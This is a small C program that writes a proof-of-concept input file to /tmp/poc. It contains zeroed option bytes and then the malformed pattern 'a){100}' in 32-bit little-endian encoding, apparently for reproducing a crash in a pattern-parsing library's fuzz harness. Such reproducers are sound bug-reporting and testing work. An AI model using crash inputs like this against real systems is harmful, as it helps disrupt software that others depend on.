#include <stdio.h>
#include <stdlib.h>

int main(void) {
    FILE *f = fopen("/tmp/poc", "wb");
    if (!f) { perror("fopen"); return 1; }

    /* Offset 0-7: 8 bytes of zeros for random_options */
    unsigned long long random_options = 0;
    fwrite(&random_options, 8, 1, f);

    /* Byte 8: 'a' (0x00000061) as 32-bit LE */
    unsigned int a_char = 0x00000061;
    fwrite(&a_char, 4, 1, f);

    /* Byte 12: ')' (0x00000029) as 32-bit LE */
    unsigned int close_paren = 0x00000029;
    fwrite(&close_paren, 4, 1, f);

    /* Byte 16: '{' (0x0000007B) as 32-bit LE */
    unsigned int open_brace = 0x0000007B;
    fwrite(&open_brace, 4, 1, f);

    /* Byte 20: '1' (0x00000031) as 32-bit LE */
    unsigned int digit_one = 0x00000031;
    fwrite(&digit_one, 4, 1, f);

    /* Byte 24: '0' (0x00000030) as 32-bit LE */
    unsigned int digit_zero = 0x00000030;
    fwrite(&digit_zero, 4, 1, f);

    /* Byte 28: '0' (0x00000030) as 32-bit LE */
    fwrite(&digit_zero, 4, 1, f);

    /* Byte 32: '}' (0x0000007D) as 32-bit LE */
    unsigned int close_brace = 0x0000007D;
    fwrite(&close_brace, 4, 1, f);

    fclose(f);
    return 0;
}